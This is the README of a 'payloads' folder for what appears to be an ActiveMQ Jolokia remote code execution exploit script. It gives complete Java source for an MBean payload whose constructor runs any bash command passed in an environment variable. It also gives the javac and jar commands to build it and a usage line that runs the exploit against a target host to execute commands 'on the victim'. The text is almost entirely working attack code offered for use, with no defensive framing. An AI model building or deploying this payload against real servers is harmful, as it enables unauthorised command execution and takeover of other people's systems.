# payloads/

Optional prebuilt artifacts for `activemq-jolokia-rce.sh`. By default that script
builds its own MBean .jar at runtime with `javac`+`jar`, so this dir is empty.
If you want a portable prebuilt jar:

```bash
mkdir -p build && cd build
cat > SystemExec.java <<'JAVA'
public class SystemExec implements SystemExecMBean {
    public SystemExec() { run(); }
    public final void run() {
        try {
            String cmd = System.getenv("EXEC_CMD");
            if (cmd == null || cmd.isEmpty()) cmd = "id";
            new ProcessBuilder(new String[]{"/bin/bash","-c",cmd}).start().waitFor();
        } catch (Exception ignored) {}
    }
}
JAVA

cat > SystemExecMBean.java <<'JAVA'
public interface SystemExecMBean { public void run(); }
JAVA

javac SystemExec.java SystemExecMBean.java
jar cf ../systemexec.jar SystemExec.class SystemExecMBean.class
```

To use:

```bash
EXEC_CMD='id; uname -a' ./activemq-jolokia-rce.sh --target 10.0.0.5:8161 \
    --jar payloads/systemexec.jar
```

Note: when using a prebuilt jar, the command runs whatever is in `EXEC_CMD` on
the victim. The runtime-built variant (default) bakes the command into the jar
directly, so there's no env-var indirection.
